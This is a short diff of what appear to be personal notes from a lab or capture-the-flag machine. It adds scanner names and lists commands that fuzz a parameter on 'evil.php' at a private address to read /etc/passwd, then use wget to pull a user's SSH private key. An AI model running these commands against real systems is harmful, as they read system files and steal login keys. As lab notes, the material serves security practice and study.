@@ -1,3 +1,6 @@
+nmap
+dirb
+dirbuster
 ffuf -u 'http://10.0.0.192/secret/evil.php?FUZZ=/etc/passwd' -w wordlists/directory-list-2.3-small.txt -fs 0
 http://10.0.0.192/secret/evil.php?command=/etc/passwd 
 wget http://10.0.0.192/secret/evil.php?command=/home/mowree/.ssh/id_rsa >> key
